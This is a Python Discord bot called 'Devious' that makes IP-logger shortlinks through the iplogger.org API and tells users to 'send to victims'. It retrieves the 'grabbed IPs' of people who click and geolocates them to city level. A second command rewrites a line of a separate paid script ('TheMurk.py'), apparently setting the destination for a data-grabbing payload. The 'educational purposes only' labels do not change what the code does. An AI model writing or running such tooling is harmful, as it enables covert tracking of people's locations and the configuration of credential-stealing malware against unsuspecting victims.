import discord
from discord.ext import commands
import requests
import random

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

bot.help_command = None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

def get_random_api_token():
    with open("api.txt", "r") as api_file:
        api_tokens = api_file.read().strip().splitlines()
        return random.choice(api_tokens)

@bot.command()
async def logger(ctx, action, arg1=None, arg2=None):
    if action == 'create':
        if arg1 and arg2:
            url = f"https://api.iplogger.org/create/shortlink/?destination={arg1}&domain={arg2}"

            headers = {
                "X-token": get_random_api_token()
            }

            try:
                response = requests.get(url, headers=headers)

                if response.status_code == 200:
                    json_response = response.json()
                    result = json_response.get("result", {})
                    shortlink = result.get("shortlink")
                    link_id = result.get("id")

                    if shortlink:
                        with open("data.txt", "a") as data_file:
                            data_file.write(f"{ctx.author.id}:{link_id}\n")
                        embed = discord.Embed(
                            title="Devious",
                            description=f"Send to victims: {shortlink}\nID: {link_id}\n\nEducational purposes only",
                            colour=0x066100
                        )
                        await ctx.author.send(embed=embed)
                        await ctx.send("Details sent to DMs and link ID saved.")
                    else:
                        await ctx.send("Error, contact admin or try again. Code: 1")
                else:
                    await ctx.send("Error, contact admin or try again. Code: 2")
            except Exception as e:
                await ctx.send(f"An error occurred: {str(e)}")
        else:
            await ctx.send("Usage: !logger create <destination> <domain>")
    elif action == 'info':
        embed = discord.Embed(
            title="Devious",
            description="Available shortlinks:\n\nmaper.info\nezstat.ru\n02ip.ru\niplis.ru\nyip.su\n2no.co\n\nExample: !logger create https://example.com maper.info\n\nEducational purposes only",
            colour=0x066100
        )
        await ctx.send(embed=embed)
    elif action == 'view':
        if arg1:
            user_id = ctx.author.id
            with open("data.txt", "r") as data_file:
                lines = data_file.read().strip().splitlines()
                for line in lines:
                    saved_user_id, link_id = line.split(":")
                    if str(user_id) == saved_user_id and arg1 == link_id:
                        url = f"https://api.iplogger.org/logger/visitors/?id={arg1}&bots=1&limit=10"

                        headers = {
                            "X-token": get_random_api_token()
                        }

                        try:
                            response = requests.get(url, headers=headers)

                            if response.status_code == 200:
                                json_response = response.json()
                                visitors = json_response.get("result", [])
                                ip_list = [visitor.get("ip") for visitor in visitors]
                                if ip_list:
                                    ip_list_text = "\n".join(ip_list)
                                    embed = discord.Embed(
                                        title="Devious",
                                        description=f"Grabbed IPs:\n\n{ip_list_text}\n\nEducational purposes only",
                                        colour=0x066100
                                    )
                                    await ctx.author.send(embed=embed)
                                    await ctx.send("Details sent to DMs.")
                                else:
                                    await ctx.send("No IP addresses found.")
                            else:
                                await ctx.send("Error, contact admin or try again. Code: 1")
                        except Exception as e:
                            await ctx.send(f"An error occurred: {str(e)}")
                        break
                else:
                    await ctx.send("You do not have permission to view this link ID.")
        else:
            await ctx.send("Usage: !logger view <link_id>")
    elif action == 'ipinfo':
        if arg1:
            url = f"http://ip-api.com/json/{arg1}"

            try:
                response = requests.get(url)

                if response.status_code == 200:
                    ip_info = response.json()
                    country = ip_info.get("country")
                    country_code = ip_info.get("countryCode")
                    region = ip_info.get("region")
                    region_name = ip_info.get("regionName")
                    city = ip_info.get("city")
                    timezone = ip_info.get("timezone")

                    if country and country_code and region_name and city and timezone:
                        embed = discord.Embed(
                            title="IP Info",
                            description=f"Country: {country}\nCountry Code: {country_code}\nRegion: {region_name}\nCity: {city}\nTimezone: {timezone}",
                            colour=0x066100
                        )
                        await ctx.send(embed=embed)
                    else:
                        await ctx.send("IP information not available for this IP address.")
                else:
                    await ctx.send("Error fetching IP information. Code: 1")
            except Exception as e:
                await ctx.send(f"An error occurred: {str(e)}")
        else:
            await ctx.send("Usage: !logger ipinfo <ip_address>")
    else:
        await ctx.send('Unknown action. Available actions: create, info, view, ipinfo')

@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="Devious",
        description="Available shortlinks:\n\nmaper.info\nnezstat.ru\n02ip.ru\niplis.ru\nyip.su\n2no.co\n\nExamples:\n\n!logger create https://example.com/ maper.info\n!logger view <id>\n!logger ipinfo <ip>\n!logger info\n\nEducational purposes only",
        colour=0x066100
    )
    await ctx.send(embed=embed)

@bot.command()
async def grab(ctx, action, arg1=None):
    if action == 'create':
        if arg1:
            target_file_path = "paid/The Murk/TheMurk.py"
            new_line = f'discordData = ["{arg1}", "lmao"]'

            try:
                with open(target_file_path, "r", encoding='utf-8') as file:
                    lines = file.readlines()

                lines[19] = new_line + "\n"

                with open(target_file_path, "w", encoding='utf-8') as file:
                    file.writelines(lines)

                await ctx.send(f"Successfully changed the line in {target_file_path}")
            except Exception as e:
                await ctx.send(f"An error occurred: {str(e)}")
        else:
            await ctx.send("Usage: !grab create <value_to_replace>")
    else:
        await ctx.send('Unknown action. Available action: create')

# Read the token from token.txt
with open("token.txt", "r") as token_file:
    bot_token = token_file.read().strip()

# Run the bot with the token read from token.txt
bot.run(bot_token)
